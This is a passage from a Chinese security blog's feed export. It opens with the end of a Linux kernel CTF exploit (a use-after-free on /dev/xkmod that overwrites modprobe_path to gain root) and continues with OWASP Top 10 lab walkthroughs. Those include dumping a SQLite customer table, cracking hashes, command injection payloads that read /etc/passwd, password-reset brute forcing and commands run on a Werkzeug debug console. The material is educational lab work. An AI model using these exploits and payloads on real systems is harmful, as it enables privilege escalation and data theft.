number">0xffffffff00000000</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to leak"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak<span class="token operator">-</span><span class="token number">0xffffffff81000030</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* UAF2 */</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] ------UAF2------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd3 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd3<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev3 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd4 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd4<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev4 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[-] Dev3 Closed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> MODPROBE_PATH<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">;</span><span class="token function">set</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"/home/getflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh\n/bin/chmod 777 /flag' > /home/getflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/getflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\\xff\\xff\\xff\\xff' > /home/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> flag_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to chmod flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/e68c51cce1233afc601332d12b0295fe_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Top10-2021</title>
      <link href="/2024/03/18/OWASP%20Top10-2021/"/>
      <url>/2024/03/18/OWASP%20Top10-2021/</url>
      
        <content type="html"><![CDATA[<p><img src="/PenTest_FILE/62b245fc43da713b2baaf5cdbc83d61b_MD5.jpeg"><br><strong>开放式Web应用程序安全项目</strong>（<strong>OWASP</strong>）是一个在线社区，在<a href="https://zh.wikipedia.org/w/index.php?title=Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8&action=edit&redlink=1">Web应用安全</a>领域提供免费的文章，方法，文档，工具和技术。—–摘自维基百科</p><h1 id="一、访问控制漏洞"><a href="#一、访问控制漏洞" class="headerlink" title="一、访问控制漏洞"></a>一、访问控制漏洞</h1><p>网站的页面受到保护，不会被普通访问者访问。例如，只有站点的管理员用户应该能够访问页面来管理其他用户。如果网站访问者可以访问他们不应该看到的受保护页面，那么访问控制就会被破坏。</p><p>普通访问者能够访问受保护的页面可能会导致以下情况：</p><ul><li>能够查看其他用户的敏感信息</li><li>访问未经授权的功能</li></ul><h2 id="IDOR"><a href="#IDOR" class="headerlink" title="IDOR"></a>IDOR</h2><p>IDOR 或不安全直接对象引用是指访问控制漏洞，您可以通过该漏洞访问通常看不到的资源。当程序员公开直接对象引用时，就会发生这种情况，该引用只是引用服务器内特定对象的标识符。就对象而言，我们可以指文件、用户、银行应用程序中的银行帐户或任何其他东西。</p><p>假设我们正在登录我们的银行帐户，并在正确验证自己身份后，我们会看到这样的 URL <code>https://bank.thm/account?id=111111</code> 。在该页面上，我们可以看到所有重要的银行详细信息，用户会做任何他们需要做的事情并继续前进，认为没有任何问题。<br><img src="/PenTest_FILE/97f8a530d314117566bfd1e7b060072e_MD5.jpeg"></p><p>然而，这里存在一个潜在的巨大问题，任何人都可以将 <code>id</code> 参数更改为 <code>222222</code> 之类的其他参数，如果站点配置不正确，那么他就会访问他人的银行信息。<br><img src="/PenTest_FILE/Pasted%20image%2020240308203059.png"></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>略</p><h1 id="二、加密故障"><a href="#二、加密故障" class="headerlink" title="二、加密故障"></a>二、加密故障</h1><p>加密故障是指因滥用（或缺乏使用）保护敏感信息的加密算法而产生的任何漏洞。 Web 应用程序需要加密技术来为其用户提供多个级别的机密性。</p><p>以安全电子邮件应用程序为例：</p><ul><li>当您使用浏览器访问电子邮件帐户时，您需要确保您与服务器之间的通信已加密。这样，任何试图捕获您的网络数据包的窃听者都将无法恢复您的电子邮件地址的内容。当我们加密客户端和服务器之间的网络流量时，我们通常将其称为加密传输中的数据。</li><li>由于您的电子邮件存储在由您的提供商管理的某些服务器中，因此电子邮件提供商也希望无法读取其客户的电子邮件。为此，您的电子邮件在存储在服务器上时也可能会被加密。这称为静态数据加密。</li></ul><p>加密失败的后果？</p><ul><li>加密失败通常会导致网络应用程序意外泄露敏感数据。这通常是与客户直接相关的数据（例如姓名、出生日期、财务信息），但也可能是更多技术信息，例如用户名和密码。</li><li>在更复杂的层面上，利用某些加密失败通常涉及诸如“中间人攻击”之类的技术，攻击者可以通过这种技术强制用户通过他们控制的设备进行连接。然后，他们将利用对任何传输数据的弱加密来访问截获的信息（如果数据一开始就被加密）。当然，许多示例要简单得多，并且可以在 Web 应用程序中找到漏洞，无需高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在网络服务器本身上找到。</li></ul><h2 id="材料1"><a href="#材料1" class="headerlink" title="材料1"></a>材料1</h2><p>可从多个位置轻松访问的格式存储大量数据的最常见方法是在数据库中。这对于 Web 应用程序之类的东西来说是完美的，因为许多用户可以随时与网站交互。数据库引擎通常遵循结构化查询语言（SQL）语法。</p><p>在生产环境中，通常会看到数据库设置在运行 MySQL 或 MariaDB 等数据库服务的专用服务器上；但是，数据库也可以存储为文件。这些被称为“<code>flat-file</code>”数据库，因为它们作为单个文件存储在计算机上。这比设置整个数据库服务器要容易得多，并且可能会在较小的 Web 应用程序中看到。访问数据库服务器超出了今天任务的范围，因此让我们关注平面文件数据库。</p><p>如前所述，平面文件数据库作为文件存储在计算机磁盘上。通常，这对于网络应用程序来说不是问题，但如果数据库存储在网站的根目录下（即连接到网站的用户可以访问的文件之一），会发生什么情况？好吧，我们可以在自己的机器上下载和查询它，并且可以完全访问数据库中的所有内容。确实是敏感数据泄露！</p><hr><p>现在让我们简要介绍一下用于查询平面文件数据库的一些语法：</p><p>平面文件数据库最常见（也是最简单）的格式是 SQLite 数据库。这些可以在大多数编程语言中进行交互，并且有一个专用的客户端用于在命令行上查询它们。该客户端称为 <code>sqlite3</code> ，默认安装在许多 Linux 发行版上。</p><p>假设我们已成功下载数据库：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ ls -l -rw-r--r-- 1 user user 8192 Feb  2 20:33 example.dbuser@linux$ file example.db example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要访问它，我们使用 <code>sqlite3 &lt;database-name&gt;</code>命令 ：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47Enter ".help" for usage hints.sqlite> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以使用 <code>.tables</code> 命令查看数据库中的表：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47Enter ".help" for usage hints.sqlite> .tablescustomers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，我们可以转储表中的所有数据，但是除非查看表信息，否则我们不一定知道每一列的含义。首先，我们使用 <code>PRAGMA table_info(customers);</code> 来查看表信息。然后我们将使用 <code>SELECT * FROM customers;</code> 从表中转储数据：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sqlite> PRAGMA table_info(customers);0|cudtID|INT|1||11|custName|TEXT|1||02|creditCard|TEXT|0||03|password|TEXT|1||0sqlite> SELECT * FROM customers;0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf991|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b193|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f704|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe6795|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="材料2"><a href="#材料2" class="headerlink" title="材料2"></a>材料2</h2><p>在哈希破解方面，Kali 预装了各种工具。如果您知道如何使用这些，请随意使用；然而，它们超出了本材料的范围。</p><p>相反，我们将使用在线工具：<a href="https://crackstation.net/">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</a>，进行彩虹表碰撞</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><p>浏览一下网络应用程序。开发人员给自己留下了一条注释，表明特定目录中有敏感数据。</p><ul><li>上述目录的名称是什么？答：<br>首页没有什么问题<br><img src="/PenTest_FILE/fa24095329b4d7b35762a42a51446691_MD5.jpeg"><br>在login看到了注释 assets<br><img src="/PenTest_FILE/a6979d552ab0aba1a1598ed86cbdaa6e_MD5.jpeg"></li></ul><p><img src="/PenTest_FILE/0ef27edd8e8b031ff089bd212b836ef8_MD5.jpeg"></p><p>下载webapp.db<br><img src="/PenTest_FILE/ef4b0b0e27099daa051888c28929ebf2_MD5.jpeg"><br>彩虹表打一下，密码qwertyuiop<br><img src="/PenTest_FILE/e74e0a1744696b32a4f04617ca3a825e_MD5.jpeg"></p><p><img src="/PenTest_FILE/f2d9cdd3125fba348d4a5f93f0b749cf_MD5.jpeg"></p><ul><li>导航到您在问题一中找到的目录。哪些文件可能包含敏感数据？：webapp.db</li><li>使用支持材料访问敏感数据。管理员用户的密码哈希是什么？答：6eea9b7ef19179a06954edd0f6c05ceb</li><li>管理员的明文密码是什么？答：qwertyuiop</li><li>以管理员身份登录。旗帜是什么？答：THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</li></ul><h1 id="三、注入"><a href="#三、注入" class="headerlink" title="三、注入"></a>三、注入</h1><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>让我们考虑一个场景：MooCorp 已开始开发一个基于 Web 的应用程序，用于具有可自定义文本的奶牛 ASCII 艺术。在寻找实现应用程序的方法时，他们使用 Linux 中的 <code>cowsay</code> 命令。他们决定编写一些简单的代码，从操作系统的控制台调用owsay命令并将其内容发送回网站，而不是编写整个Web应用程序来实现艺术字的逻辑。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mooing"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$mooing</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mooing"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$cow</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'default'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cow"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token variable">$cow</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cow"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"perl /usr/bin/cowsay -f <span class="token interpolation"><span class="token variable">$cow</span></span> <span class="token interpolation"><span class="token variable">$mooing</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/PenTest_FILE/ce81de0e88486be6a6bd78efc5bd1fe1_MD5.jpeg"></p><p>现在我们知道了应用程序如何在幕后工作，我们将利用称为“内联命令”的 bash 功能来滥用owsay服务器并执行我们想要的任何任意命令。</p><p>要执行内联命令，只需按以下格式将它们括起来 <code>$(your_command_here)</code> ：<strong>如果控制台检测到内联命令，它会先执行它，然后将结果作为外部命令的参数</strong>。请看以下示例，该示例将 <code>whoami</code> 作为 <code>echo</code> 命令内的内联命令运行：<br><img src="/PenTest_FILE/b16d18b7699611da0a4c93b6a0f2e76c_MD5.jpeg"></p><p>回到cowsay服务器，如果我们向web应用程序发送内联命令，将会发生如下情况：<br><img src="/PenTest_FILE/6ed0ab0e8426c7a5dd18820555a8b37f_MD5.jpeg"></p><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><ul><li><p>网站根目录下有什么奇怪的文本文件？答：drpepper.txt</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>有多少个非 root&#x2F;非服务&#x2F;非守护程序用户？答：0</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/passwd<span class="token variable">)</span></span> _________________________________________ / root:x:0:0:root:/root:/bin/ash          <span class="token punctuation">\</span><span class="token operator">|</span> bin:x:1:1:bin:/bin:/sbin/nologin        <span class="token operator">|</span><span class="token operator">|</span> daemon:x:2:2:daemon:/sbin:/sbin/nologin <span class="token operator">|</span><span class="token operator">|</span> adm:x:3:4:adm:/var/adm:/sbin/nologin    <span class="token operator">|</span><span class="token operator">|</span> lp:x:4:7:lp:/var/spool/lpd:/sbin/nologi <span class="token operator">|</span><span class="token operator">|</span> n sync:x:5:0:sync:/sbin:/bin/sync       <span class="token operator">|</span><span class="token operator">|</span> shutdown:x:6:0:shutdown:/sbin:/sbin/shu <span class="token operator">|</span><span class="token operator">|</span> tdown halt:x:7:0:halt:/sbin:/sbin/halt  <span class="token operator">|</span><span class="token operator">|</span> mail:x:8:12:mail:/var/mail:/sbin/nologi <span class="token operator">|</span><span class="token operator">|</span> n                                       <span class="token operator">|</span><span class="token operator">|</span> news:x:9:13:news:/usr/lib/news:/sbin/no <span class="token operator">|</span><span class="token operator">|</span> login                                   <span class="token operator">|</span><span class="token operator">|</span> uucp:x:10:14:uucp:/var/spool/uucppublic <span class="token operator">|</span><span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span><span class="token operator">|</span> operator:x:11:0:operator:/root:/sbin/no <span class="token operator">|</span><span class="token operator">|</span> login                                   <span class="token operator">|</span><span class="token operator">|</span> man:x:13:15:man:/usr/man:/sbin/nologin  <span class="token operator">|</span><span class="token operator">|</span> postmaster:x:14:12:postmaster:/var/mail <span class="token operator">|</span><span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span><span class="token operator">|</span> cron:x:16:16:cron:/var/spool/cron:/sbin <span class="token operator">|</span><span class="token operator">|</span> /nologin                                <span class="token operator">|</span><span class="token operator">|</span> ftp:x:21:21::/var/lib/ftp:/sbin/nologin <span class="token operator">|</span><span class="token operator">|</span> sshd:x:22:22:sshd:/dev/null:/sbin/nolog <span class="token operator">|</span><span class="token operator">|</span> <span class="token keyword">in</span>                                      <span class="token operator">|</span><span class="token operator">|</span> at:x:25:25:at:/var/spool/cron/atjobs:/s <span class="token operator">|</span><span class="token operator">|</span> bin/nologin                             <span class="token operator">|</span><span class="token operator">|</span> squid:x:31:31:Squid:/var/cache/squid:/s <span class="token operator">|</span><span class="token operator">|</span> bin/nologin xfs:x:33:33:X Font          <span class="token operator">|</span><span class="token operator">|</span> Server:/etc/X11/fs:/sbin/nologin        <span class="token operator">|</span><span class="token operator">|</span> games:x:35:35:games:/usr/games:/sbin/no <span class="token operator">|</span><span class="token operator">|</span> login                                   <span class="token operator">|</span><span class="token operator">|</span> cyrus:x:85:12::/usr/cyrus:/sbin/nologin <span class="token operator">|</span><span class="token operator">|</span> vpopmail:x:89:89::/var/vpopmail:/sbin/n <span class="token operator">|</span><span class="token operator">|</span> ologin                                  <span class="token operator">|</span><span class="token operator">|</span> ntp:x:123:123:NTP:/var/empty:/sbin/nolo <span class="token operator">|</span><span class="token operator">|</span> gin                                     <span class="token operator">|</span><span class="token operator">|</span> smmsp:x:209:209:smmsp:/var/spool/mqueue <span class="token operator">|</span><span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span><span class="token operator">|</span> guest:x:405:100:guest:/dev/null:/sbin/n <span class="token operator">|</span><span class="token operator">|</span> ologin                                  <span class="token operator">|</span><span class="token operator">|</span> nobody:x:65534:65534:nobody:/:/sbin/nol <span class="token operator">|</span><span class="token operator">|</span> ogin                                    <span class="token operator">|</span><span class="token operator">|</span> apache:x:100:101:apache:/var/www:/sbin/ <span class="token operator">|</span><span class="token punctuation">\</span> nologin                                 / -----------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>该应用程序以什么用户身份运行？答：apache</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>用户的shell设置为什么？答：&#x2F;sbin&#x2F;nologin</p></li><li><p>正在运行什么版本的 Alpine Linux？答：3.16.0<br>百度一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/alpine-release<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="四、不安全的设计"><a href="#四、不安全的设计" class="headerlink" title="四、不安全的设计"></a>四、不安全的设计</h1><h2 id="不安全的密码设置"><a href="#不安全的密码设置" class="headerlink" title="不安全的密码设置"></a>不安全的密码设置</h2><p>不久前 Instagram 上就出现了此类漏洞的一个很好的例子。 Instagram 允许用户通过短信向他们的手机号码发送 6 位代码进行验证，从而重置忘记的密码。如果攻击者想要访问受害者的帐户，他可以尝试暴力破解 6 位代码。正如预期的那样，这不可能直接实现，因为 Instagram 实施了速率限制，在 250 次尝试后用户将被阻止进一步尝试。</p><p>然而，我们发现速率限制仅适用于来自同一 IP 的代码尝试。如果攻击者有多个不同的 IP 地址来发送请求，他现在可以为每个 IP 尝试 250 个代码。对于 6 位代码，有一百万个可能的代码，因此攻击者需要 1000000&#x2F;250 &#x3D; 4000 个 IP 才能覆盖所有可能的代码。这听起来似乎需要拥有大量的 IP，但云服务可以轻松地以相对较小的成本获取这些 IP，从而使这种攻击变得可行。</p><p>请注意该漏洞与以下想法的关系：<strong>没有用户能够使用数千个 IP 地址发出并发请求来尝试暴力破解数字代码</strong>。问题在于设计而不是应用程序本身的实现。</p><h2 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h2><p>进入界面，我们已知存在一个叫 joseph 的账户<br><img src="/PenTest_FILE/49c0c6266ac071671a8c653949afba31_MD5.jpeg"></p><p>重置密码试试：<br><img src="/PenTest_FILE/039fafd2b913859361d2e398676c06c3_MD5.jpeg"></p><p>最喜欢的颜色？感觉可以爆破一手<br><img src="/PenTest_FILE/e53a3d749562d760f4943959f538c23e_MD5.jpeg"><br>看来你喜欢green哈</p><p>也是成功重置了密码<br><img src="/PenTest_FILE/6470021c2fe4321810e8947bdb610359_MD5.jpeg"><br><img src="/PenTest_FILE/bdc9bc8a9329d78002d75e0bafff0541_MD5.jpeg"></p><h1 id="五、安全配置错误"><a href="#五、安全配置错误" class="headerlink" title="五、安全配置错误"></a>五、安全配置错误</h1><p>安全配置错误与其他十大漏洞不同，因为它们发生在本可以适当配置安全但没有进行配置的情况下</p><p>安全错误配置包括：</p><ul><li>云服务（例如 S3 存储桶）的权限配置不当。</li><li>启用不必要的功能，例如服务、页面、帐户或权限。</li><li>密码未更改的默认帐户。</li><li>错误消息过于详细，允许攻击者找到有关系统的更多信息。</li><li>不使用 HTTP 安全标头。</li></ul><h2 id="调试接口"><a href="#调试接口" class="headerlink" title="调试接口"></a>调试接口</h2><p>常见的安全错误配置涉及生产软件中调试功能的暴露。编程框架中通常提供调试功能，允许开发人员访问高级功能，这对于在开发过程中调试应用程序很有用。<strong>如果开发人员在发布应用程序之前忘记禁用其中一些调试功能，则攻击者可能会滥用其中一些调试功能。</strong></p><p>据称，2015 年 Patreon 遭到黑客攻击时就利用了此类漏洞。在 Patreon 遭到黑客攻击的五天前，一名安全研究人员向 Patreon 报告说，他发现了 Werkzeug 控制台的开放调试接口。 Werkzeug 是基于 Python 的 Web 应用程序中的重要组件，因为它为 Web 服务器提供执行 Python 代码的接口。 Werkzeug 包含一个调试控制台，可以通过 <code>/console</code> 上的 URL 访问该控制台，或者如果应用程序引发异常，该控制台也会呈现给用户。在这两种情况下，控制台都会提供一个 Python 控制台，它将运行您发送给它的任何代码。对于攻击者来说，这意味着他可以任意执行命令。</p><h2 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h2><p>导航至 <a href="http://10.10.226.188:86/console">http://10.10.226.188:86/console</a> 以访问 Werkzeug 控制台。</p><p>看样子是个python调试台<br><img src="/PenTest_FILE/1deb4efdfea453b8c26ad802ae9d1e05_MD5.jpeg"></p><ul><li>当前目录中的数据库文件名（扩展名为 .db 的文件）是什么？答：todo.db<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token punctuation">;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls -al'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'total 40\ndrwxr-xr-x    1 root     root          4096 Feb  3  2023 .\ndrwxr-xr-x    1 root     root          4096 Sep 15  2022 ..\n-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile\n-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py\n-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt\ndrwxr-xr-x    2 root     root          4096 Sep 15  2022 templates\n-rw-r--r--    1 root     root          8192 Sep 15  2022 todo.db\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>修改代码以读取 app.py 文件的内容，该文件包含应用程序的源代码。源代码中 secret_flag 变量的值是多少？答：THM{Just_a_tiny_misconfiguration}<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token punctuation">;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat app.py'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'import os\nfrom flask import Flask, render_template, request, redirect, url_for\nfrom flask_sqlalchemy import SQLAlchemy\n\nsecret_flag = "THM&#123;Just_a_tiny_misconfiguration&#125;"\n\nPROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))\nDATABASE = os.path.join(PROJECT_ROOT, \'todo.db\')\n\napp = Flask(__name__)\napp.config[\'SQLALCHEMY_DATABASE_URI\'] = "sqlite:////" + DATABASE\ndb = SQLAlchemy(app)\n\n\nclass Todo(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    title = db.Column(db.String(80))\n    complete = db.Column(db.Boolean)\n\n\n@app.route("/")\ndef index():\n    todo_list = Todo.query.all()\n    return render_template("index.html", todo_list=todo_list)\n\n\n@app.route("/add", methods=["POST"])\ndef add():\n    title = request.form.get("title")\n    new_todo = Todo(title=title, complete=False)\n    db.session.add(new_todo)\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\n@app.route("/complete/&lt;string:todo_id>")\ndef complete(todo_id):\n    todo = Todo.query.filter_by(id=todo_id).first()\n    todo.complete = not todo.complete\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\n@app.route("/delete/&lt;string:todo_id>")\ndef delete(todo_id):\n    todo = Todo.query.filter_by(id=todo_id).first()\n    db.session.delete(todo)\n    db.session.commit()\n    return 